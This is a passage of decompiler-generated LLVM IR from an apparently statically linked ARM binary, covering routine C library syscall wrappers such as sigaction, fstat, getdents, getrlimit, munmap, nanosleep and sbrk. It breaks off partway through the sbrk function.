  %v4_14920 = call i32 @__syscall_rt_sigaction(i32 %v0_14910, i32 %v0_14914, i32 %v0_14918, i32 8)
  store i32 %v3_148b4, i32* @r4, align 4
  store i32 %v6_148b4, i32* @r5, align 4
  ret i32 %v4_14920

; uselistorder directives
  uselistorder label %dec_label_pc_14910, { 2, 0, 1 }
}

define i32 @function_14934(i32 %arg1) local_unnamed_addr {
dec_label_pc_14934:
  %v0_14934 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14934, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14934
  %v2_14934 = load i32, i32* @r8, align 4
  %v4_14934 = mul i32 %v2_14934, 2
  %v5_14934 = and i32 %v4_14934, %arg1
  %v2_14938 = load i32, i32* @ip, align 4
  %v4_14938 = lshr i32 %v2_14938, %v5_14934
  %v5_14938 = sub i32 32, %v5_14934
  %v6_14938 = shl i32 %v2_14938, %v5_14938
  %v7_14938 = or i32 %v6_14938, %v4_14938
  %v9_14938 = and i32 %v7_14938, %v5_14934
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14934, %bb
  %v10_14938 = phi i32 [ %arg1, %dec_label_pc_14934 ], [ %v9_14938, %bb ]
  ret i32 %v10_14938

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_14940 = call i32 @__sigsetjmp()
  ret i32 %v0_14940
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14970 = load i32, i32* @r7, align 4
  store i32 %v3_14970, i32* %stack_var_-8, align 4
  %v0_1497c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1497c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1497c, -4095
  br i1 %tmp, label %dec_label_pc_149a4, label %dec_label_pc_1498c

dec_label_pc_1498c:                               ; preds = %entry
  %v0_14990 = call i32 @__aeabi_read_tp()
  %v3_14994 = load i16, i16* @global_var_216f0.341, align 2
  %v4_14994 = sext i16 %v3_14994 to i32
  %v0_14998 = load i32, i32* %r2.global-to-local, align 4
  %v1_14998 = sub i32 0, %v0_14998
  store i32 %v1_14998, i32* %r2.global-to-local, align 4
  %v3_1499c = add i32 %v4_14994, %v0_14990
  %v4_1499c = inttoptr i32 %v3_1499c to i32*
  store i32 %v1_14998, i32* %v4_1499c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_149a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_149a4

dec_label_pc_149a4:                               ; preds = %entry, %dec_label_pc_1498c
  %v1_149a8 = phi i32 [ %v0_1497c, %entry ], [ -1, %dec_label_pc_1498c ]
  %v2_149a4 = phi i32 [ %v3_14970, %entry ], [ %v2_149a4.pre, %dec_label_pc_1498c ]
  store i32 %v2_149a4, i32* @r7, align 4
  ret i32 %v1_149a8

; uselistorder directives
  uselistorder i32 %v0_1497c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_149a4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_149bc

dec_label_pc_149bc:                               ; preds = %dec_label_pc_149e8, %dec_label_pc_149fc, %entry
  %v0_149bc = phi i32 [ %arg1, %entry ], [ %v0_149bc.pre.pre, %dec_label_pc_149fc ], [ %v0_149e8, %dec_label_pc_149e8 ]
  store i32 %v0_149bc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_149bc, -4095
  br i1 %tmp, label %dec_label_pc_149e8, label %dec_label_pc_149d8

dec_label_pc_149d8:                               ; preds = %dec_label_pc_149bc
  %v0_149d8 = call i32 @__aeabi_read_tp()
  %v0_149dc = load i32, i32* %r2.global-to-local, align 4
  %v1_149dc = sub i32 0, %v0_149dc
  store i32 %v1_149dc, i32* %r2.global-to-local, align 4
  %v3_149e0 = load i16, i16* @global_var_216f0.341, align 2
  %v4_149e0 = sext i16 %v3_149e0 to i32
  %v3_149e4 = add i32 %v4_149e0, %v0_149d8
  %v4_149e4 = inttoptr i32 %v3_149e4 to i32*
  store i32 %v1_149dc, i32* %v4_149e4, align 4
  %v0_149e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_149e8

dec_label_pc_149e8:                               ; preds = %dec_label_pc_149bc, %dec_label_pc_149d8
  %v0_149e8 = phi i32 [ %v0_149bc, %dec_label_pc_149bc ], [ %v0_149e8.pre, %dec_label_pc_149d8 ]
  store i32 %v0_149e8, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_149e8, -4095
  br i1 %tmp4, label %dec_label_pc_149bc, label %dec_label_pc_149fc

dec_label_pc_149fc:                               ; preds = %dec_label_pc_149e8
  %v0_149fc = call i32 @__aeabi_read_tp()
  %v0_14a00 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a00 = sub i32 0, %v0_14a00
  store i32 %v1_14a00, i32* %r2.global-to-local, align 4
  %v3_14a04 = load i16, i16* @global_var_216f0.341, align 2
  %v4_14a04 = sext i16 %v3_14a04 to i32
  %v3_14a08 = add i32 %v4_14a04, %v0_149fc
  %v4_14a08 = inttoptr i32 %v3_14a08 to i32*
  store i32 %v1_14a00, i32* %v4_14a08, align 4
  %v0_149bc.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_149bc

; uselistorder directives
  uselistorder i32 %v0_149e8, { 0, 2, 1 }
  uselistorder i32 %v0_149bc, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_149e8, { 1, 0 }
  uselistorder label %dec_label_pc_149bc, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_14a20 = load i32, i32* @r1, align 4
  store i32 %v0_14a20, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_14a30 = load i32, i32* @r0, align 4
  store i32 %v0_14a30, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_14a30, -4095
  br i1 %tmp, label %dec_label_pc_14a58, label %dec_label_pc_14a3c

dec_label_pc_14a3c:                               ; preds = %entry
  %v0_14a40 = call i32 @__aeabi_read_tp()
  %v3_14a44 = load i16, i16* @global_var_216f0.341, align 2
  %v4_14a44 = sext i16 %v3_14a44 to i32
  store i32 %v4_14a44, i32* @r3, align 4
  %v0_14a48 = load i32, i32* @r2, align 4
  %v1_14a48 = sub i32 0, %v0_14a48
  store i32 %v1_14a48, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_14a50 = add i32 %v4_14a44, %v0_14a40
  %v4_14a50 = inttoptr i32 %v3_14a50 to i32*
  store i32 %v1_14a48, i32* %v4_14a50, align 4
  br label %dec_label_pc_14a68

dec_label_pc_14a58:                               ; preds = %entry
  store i32 %v0_14a30, i32* %r7.global-to-local, align 4
  %v2_14a58 = icmp eq i32 %v0_14a30, 0
  br i1 %v2_14a58, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14a58
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14a58, %bb
  call void @__pseudo_cond_branch(i1 %v2_14a58, i32 ptrtoint (i32* @global_var_14ea8.576 to i32))
  br label %dec_label_pc_14a68

dec_label_pc_14a68:                               ; preds = %dec_label_pc_14a3c, %.thread
  %v0_14a68 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_14a68

; uselistorder directives
  uselistorder i32 %v0_14a30, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14a68, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_14a7c = load i32, i32* @r5, align 4
  %v18_14a7c = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14ab4, label %dec_label_pc_14a98

dec_label_pc_14a98:                               ; preds = %entry
  %v1_14a9c = sub i32 0, %arg1
  %v3_14aa0 = load i16, i16* @global_var_216f0.341, align 2
  %v4_14aa0 = sext i16 %v3_14aa0 to i32
  store i32 %v4_14aa0, i32* %r3.global-to-local, align 4
  %v0_14aa4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_14aac = add i32 %v4_14aa0, %v0_14aa4
  %v4_14aac = inttoptr i32 %v3_14aac to i32*
  store i32 %v1_14a9c, i32* %v4_14aac, align 4
  br label %dec_label_pc_14b08

dec_label_pc_14ab4:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14ab4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_14abc = add i32 %arg2, %arg1
  store i32 %v3_14abc, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14ab4, %bb
  %v1_14af84 = phi i32 [ %v18_14a7c, %dec_label_pc_14ab4 ], [ %v3_14abc, %bb ]
  %v0_14af42 = phi i32 [ 141, %dec_label_pc_14ab4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_14b08, label %dec_label_pc_14af4

dec_label_pc_14ac8:                               ; preds = %dec_label_pc_14af4
  %v1_14afc = inttoptr i32 %v1_14af4 to i8*
  %v1_14ac8 = add i32 %v0_14ac8, 8
  %v2_14ac8 = inttoptr i32 %v1_14ac8 to i16*
  %v3_14ac8 = load i16, i16* %v2_14ac8, align 2
  %v4_14ac8 = zext i16 %v3_14ac8 to i32
  %v2_14acc = add i32 %v4_14ac8, %v0_14ac8
  store i32 %v2_14acc, i32* @r3, align 4
  %v1_14ad0 = add i32 %v2_14acc, -1
  %v2_14ad0 = inttoptr i32 %v1_14ad0 to i8*
  %v3_14ad0 = load i8, i8* %v2_14ad0, align 1
  %v4_14ad0 = zext i8 %v3_14ad0 to i32
  store i32 %v4_14ad0, i32* @r4, align 4
  %v3_14ad4 = call i32 @strlen(i8* %v1_14afc)
  %v0_14ad8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_14ad8, i32* @r1, align 4
  %v1_14adc = add i32 %v3_14ad4, 1
  store i32 %v1_14adc, i32* @r2, align 4
  %v0_14ae0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14ae0, i32* @r0, align 4
  %v3_14ae4 = call i32 @memmove(i32 %v0_14ae0, i32 %v0_14ad8, i32 %v1_14adc)
  %v0_14ae8 = load i32, i32* %r7.global-to-local, align 4
  %v1_14ae8 = add i32 %v0_14ae8, 8
  %v2_14ae8 = inttoptr i32 %v1_14ae8 to i16*
  %v3_14ae8 = load i16, i16* %v2_14ae8, align 2
  %v4_14ae8 = zext i16 %v3_14ae8 to i32
  store i32 %v4_14ae8, i32* %r3.global-to-local, align 4
  %v0_14aec = load i32, i32* @r4, align 4
  %v1_14aec = trunc i32 %v0_14aec to i8
  %v3_14aec = add i32 %v0_14ae8, 10
  %v4_14aec = inttoptr i32 %v3_14aec to i8*
  store i8 %v1_14aec, i8* %v4_14aec, align 1
  %v0_14af0 = load i32, i32* %r7.global-to-local, align 4
  %v1_14af0 = load i32, i32* %r3.global-to-local, align 4
  %v2_14af0 = add i32 %v1_14af0, %v0_14af0
  store i32 %v2_14af0, i32* %r7.global-to-local, align 4
  %v1_14af8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_14af4

dec_label_pc_14af4:                               ; preds = %.thread, %dec_label_pc_14ac8
  %v1_14af8 = phi i32 [ %v1_14af8.pre, %dec_label_pc_14ac8 ], [ %v1_14af84, %.thread ]
  %v0_14ac8 = phi i32 [ %v2_14af0, %dec_label_pc_14ac8 ], [ %v0_14af42, %.thread ]
  %v1_14af4 = add i32 %v0_14ac8, 10
  store i32 %v1_14af4, i32* %r6.global-to-local, align 4
  %v3_14af8 = icmp ult i32 %v0_14ac8, %v1_14af8
  %v1_14b00 = add i32 %v0_14ac8, 11
  store i32 %v1_14b00, i32* %r8.global-to-local, align 4
  br i1 %v3_14af8, label %dec_label_pc_14ac8, label %dec_label_pc_14b08

dec_label_pc_14b08:                               ; preds = %dec_label_pc_14af4, %.thread, %dec_label_pc_14a98
  %v0_14b08 = load i32, i32* @r5, align 4
  store i32 %v6_14a7c, i32* @r5, align 4
  store i32 %v18_14a7c, i32* @sl, align 4
  ret i32 %v0_14b08

; uselistorder directives
  uselistorder i32 %v1_14af4, { 1, 0 }
  uselistorder i32 %v0_14ac8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_14a7c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_14af4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_14b20 = ptrtoint i32* %stack_var_-16 to i32
  %v2_14b2c = call i32 @getrlimit(i32 7, i32 %v2_14b20)
  %v1_14b30 = icmp slt i32 %v2_14b2c, 0
  %v5_14b34 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_14b30, i32 256, i32 %v5_14b34
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_14b58 = load i32, i32* @r0, align 4
  ret i32 %v1_14b58
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_14b6c = load i32, i32* @r0, align 4
  ret i32 %v1_14b6c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_14b80 = load i32, i32* @r0, align 4
  ret i32 %v1_14b80
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_14b90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 148) to i32*), align 4
  %v1_14b94 = inttoptr i32 %v4_14b90 to i32*
  %v2_14b94 = load i32, i32* %v1_14b94, align 4
  %v2_14b98 = icmp eq i32 %v2_14b94, 0
  br i1 %v2_14b98, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_14ba0 = phi i32 [ %v2_14b94, %entry ], [ 4096, %bb ]
  ret i32 %v1_14ba0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14bd8, label %dec_label_pc_14bc0

dec_label_pc_14bc0:                               ; preds = %entry
  %v1_14bc4 = sub i32 0, %arg1
  %v3_14bc8 = load i16, i16* @global_var_216f0.341, align 2
  %v4_14bc8 = sext i16 %v3_14bc8 to i32
  %v0_14bcc = call i32 @__aeabi_read_tp()
  %v3_14bd0 = add i32 %v4_14bc8, %v0_14bcc
  %v4_14bd0 = inttoptr i32 %v3_14bd0 to i32*
  store i32 %v1_14bc4, i32* %v4_14bd0, align 4
  br label %dec_label_pc_14bd8

dec_label_pc_14bd8:                               ; preds = %entry, %dec_label_pc_14bc0
  %v1_14bdc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14bc0 ]
  ret i32 %v1_14bdc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bd8, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14be4 = load i32, i32* @r7, align 4
  store i32 %v3_14be4, i32* %stack_var_-8, align 4
  %v0_14bf0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14bf0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14bf0, -4095
  br i1 %tmp, label %dec_label_pc_14c18, label %dec_label_pc_14c00

dec_label_pc_14c00:                               ; preds = %entry
  %v0_14c04 = call i32 @__aeabi_read_tp()
  %v3_14c08 = load i16, i16* @global_var_216f0.341, align 2
  %v4_14c08 = sext i16 %v3_14c08 to i32
  store i32 %v4_14c08, i32* @r3, align 4
  %v0_14c0c = load i32, i32* %r2.global-to-local, align 4
  %v1_14c0c = sub i32 0, %v0_14c0c
  store i32 %v1_14c0c, i32* %r2.global-to-local, align 4
  %v3_14c10 = add i32 %v4_14c08, %v0_14c04
  %v4_14c10 = inttoptr i32 %v3_14c10 to i32*
  store i32 %v1_14c0c, i32* %v4_14c10, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14c18.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14c18

dec_label_pc_14c18:                               ; preds = %entry, %dec_label_pc_14c00
  %v1_14c1c = phi i32 [ %v0_14bf0, %entry ], [ -1, %dec_label_pc_14c00 ]
  %v2_14c18 = phi i32 [ %v3_14be4, %entry ], [ %v2_14c18.pre, %dec_label_pc_14c00 ]
  store i32 %v2_14c18, i32* @r7, align 4
  ret i32 %v1_14c1c

; uselistorder directives
  uselistorder i32 %v0_14bf0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14c18, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_14c34 = load i32, i32* @r0, align 4
  ret i32 %v1_14c34
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14c38 = load i32, i32* @r4, align 4
  store i32 %v3_14c38, i32* %stack_var_-12, align 4
  %v0_14c48 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14c48, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14c48, -4095
  br i1 %tmp, label %dec_label_pc_14c70, label %dec_label_pc_14c58

dec_label_pc_14c58:                               ; preds = %entry
  %v0_14c5c = call i32 @__aeabi_read_tp()
  %v3_14c60 = load i16, i16* @global_var_216f0.341, align 2
  %v4_14c60 = sext i16 %v3_14c60 to i32
  %v0_14c64 = load i32, i32* %r2.global-to-local, align 4
  %v1_14c64 = sub i32 0, %v0_14c64
  store i32 %v1_14c64, i32* %r2.global-to-local, align 4
  %v3_14c68 = add i32 %v4_14c60, %v0_14c5c
  %v4_14c68 = inttoptr i32 %v3_14c68 to i32*
  store i32 %v1_14c64, i32* %v4_14c68, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14c70.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14c70

dec_label_pc_14c70:                               ; preds = %entry, %dec_label_pc_14c58
  %v1_14c74 = phi i32 [ %v0_14c48, %entry ], [ -1, %dec_label_pc_14c58 ]
  %v2_14c70 = phi i32 [ %v3_14c38, %entry ], [ %v2_14c70.pre, %dec_label_pc_14c58 ]
  store i32 %v2_14c70, i32* @r4, align 4
  ret i32 %v1_14c74

; uselistorder directives
  uselistorder i32 %v0_14c48, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14c70, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14c7c = load i32, i32* @r7, align 4
  store i32 %v3_14c7c, i32* %stack_var_-8, align 4
  %v0_14c88 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14c88, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14c88, -4095
  br i1 %tmp, label %dec_label_pc_14cb0, label %dec_label_pc_14c98

dec_label_pc_14c98:                               ; preds = %entry
  %v0_14c9c = call i32 @__aeabi_read_tp()
  %v3_14ca0 = load i16, i16* @global_var_216f0.341, align 2
  %v4_14ca0 = sext i16 %v3_14ca0 to i32
  %v0_14ca4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ca4 = sub i32 0, %v0_14ca4
  store i32 %v1_14ca4, i32* %r2.global-to-local, align 4
  %v3_14ca8 = add i32 %v4_14ca0, %v0_14c9c
  %v4_14ca8 = inttoptr i32 %v3_14ca8 to i32*
  store i32 %v1_14ca4, i32* %v4_14ca8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14cb0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14cb0

dec_label_pc_14cb0:                               ; preds = %entry, %dec_label_pc_14c98
  %v1_14cb4 = phi i32 [ %v0_14c88, %entry ], [ -1, %dec_label_pc_14c98 ]
  %v2_14cb0 = phi i32 [ %v3_14c7c, %entry ], [ %v2_14cb0.pre, %dec_label_pc_14c98 ]
  store i32 %v2_14cb0, i32* @r7, align 4
  ret i32 %v1_14cb4

; uselistorder directives
  uselistorder i32 %v0_14c88, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14cb0, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14cbc = load i32, i32* @r7, align 4
  store i32 %v3_14cbc, i32* %stack_var_-8, align 4
  %v0_14cc8 = load i32, i32* @r0, align 4
  store i32 %v0_14cc8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14cc8, -4095
  br i1 %tmp, label %dec_label_pc_14cf0, label %dec_label_pc_14cd8

dec_label_pc_14cd8:                               ; preds = %entry
  %v0_14cdc = call i32 @__aeabi_read_tp()
  %v3_14ce0 = load i16, i16* @global_var_216f0.341, align 2
  %v4_14ce0 = sext i16 %v3_14ce0 to i32
  %v0_14ce4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ce4 = sub i32 0, %v0_14ce4
  store i32 %v1_14ce4, i32* %r2.global-to-local, align 4
  %v3_14ce8 = add i32 %v4_14ce0, %v0_14cdc
  %v4_14ce8 = inttoptr i32 %v3_14ce8 to i32*
  store i32 %v1_14ce4, i32* %v4_14ce8, align 4
  %v2_14cf0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14cf0

dec_label_pc_14cf0:                               ; preds = %entry, %dec_label_pc_14cd8
  %v1_14cf4 = phi i32 [ %v0_14cc8, %entry ], [ -1, %dec_label_pc_14cd8 ]
  %v2_14cf0 = phi i32 [ %v3_14cbc, %entry ], [ %v2_14cf0.pre, %dec_label_pc_14cd8 ]
  store i32 %v2_14cf0, i32* @r7, align 4
  ret i32 %v1_14cf4

; uselistorder directives
  uselistorder i32 %v0_14cc8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14cf0, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_14d08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 12776) to i32*), align 4
  %v2_14d0c = icmp eq i32 %v4_14d08, 0
  %v3_14d10 = load i32, i32* @r4, align 4
  %v9_14d10 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_14d0c, label %dec_label_pc_14d20, label %entry.dec_label_pc_14d28_crit_edge

entry.dec_label_pc_14d28_crit_edge:               ; preds = %entry
  br label %dec_label_pc_14d28

dec_label_pc_14d20:                               ; preds = %entry
  store i32 %v3_14d10, i32* @r4, align 4
  store i32 %v9_14d10, i32* @r6, align 4
  %v0_14d24 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_14d28

dec_label_pc_14d28:                               ; preds = %entry.dec_label_pc_14d28_crit_edge, %dec_label_pc_14d20
  %v0_14d28 = call i32 @__libc_enable_asynccancel()
  %v0_14d2c = load i32, i32* @r6, align 4
  store i32 %v0_14d2c, i32* @r1, align 4
  store i32 %v0_14d28, i32* @r5, align 4
  %v0_14d34 = load i32, i32* @r4, align 4
  store i32 %v0_14d34, i32* @r0, align 4
  %v0_14d38 = call i32 @__syscall_nanosleep()
  store i32 %v0_14d38, i32* @r4, align 4
  %v0_14d40 = load i32, i32* @r5, align 4
  %v1_14d44 = call i32 @__libc_disable_asynccancel(i32 %v0_14d40)
  %v0_14d48 = load i32, i32* @r4, align 4
  ret i32 %v0_14d48

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 3, 2, 12, 1, 7, 6, 5, 8, 11, 4, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 3, 2, 12, 1, 7, 6, 5, 8, 11, 4, 10, 9, 0 }
  uselistorder label %dec_label_pc_14d28, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14d5c = load i32, i32* @r4, align 4
  store i32 %v3_14d5c, i32* %stack_var_-16, align 4
  store i32 11576, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r4.global-to-local, align 4
  %v4_14d6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 11576) to i32*), align 4
  %v2_14d70 = icmp eq i32 %v4_14d6c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_14d70, label %dec_label_pc_14d7c, label %dec_label_pc_14d8c

dec_label_pc_14d7c:                               ; preds = %entry
  %v1_14d80 = call i32 @__GI_brk(i32 0)
  %v1_14d84 = icmp slt i32 %v1_14d80, 0
  br i1 %v1_14d84, label %dec_label_pc_14db0, label %dec_label_pc_14d8cthread-pre-split

dec_label_pc_14d8cthread-pre-split:               ; preds = %dec_label_pc_14d7c
  %v0_14d90.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_14d8c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14d8c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14d8c

dec_label_pc_14d8c:                               ; preds = %dec_label_pc_14d8cthread-pre-split, %entry
  %v1_14d8c = phi i32 [ %v1_14d8c.pre, %dec_label_pc_14d8cthread-pre-split ], [ 11576, %entry ]
  %v0_14d8c = phi i32 [ %v0_14d8c.pre, %dec_label_pc_14d8cthread-pre-split ], [ ptrtoint (i32* @global_var_21698.346 to i32), %entry ]
  %v1_14da0 = phi i32 [ %v0_14d90.pr, %dec_label_pc_14d8cthread-pre-split ], [ %arg1, %entry ]
  %v2_14d8c = add i32 %v0_14d8c, %v1_14d8c
  %v3_14d8c = inttoptr i32 %v2_14d8c to i32*
  %v4_14d8c = load i32, i32* %v3_14d8c, align 4
  %v2_14d90 = icmp eq i32 %v1_14da0, 0
  store i32 %v4_14d8c, i32* %r4.global-to-local, align 4
  br i1 %v2_14d90, label %dec_label_pc_14db4, label %dec_label_pc_14d9c

dec_label_pc_14d9c:                               ; preds = %dec_label_pc_14d8c
  %v2_14da0 = add i32 %v4_14d8c, %v1_14da0
  %v1_14da4 = call i32 @__GI_brk(i32 %v2_14da0)
  %v1_14da8 = icmp slt i32 %v1_14da4, 0
  br i1 %v1_14da8, label %dec_label_pc_14db0, label %dec_label_pc_14d9c.dec_label_pc_14db4_crit_edge

dec_label_pc_14d9c.dec_label_pc_14db4_crit_edge:  ; preds = %dec_label_pc_14d9c
  %v0_14db4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14db4

dec_label_pc_14db0:                               ; preds = %dec_label_pc_14d9c, %dec_label_pc_14d7c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14db4

dec_label_pc_14db4:                               ; preds = %dec_label_pc_14d8c, %dec_label_pc_14d9c.dec_label_pc_14db4_crit_edge, %dec_label_pc_14db0
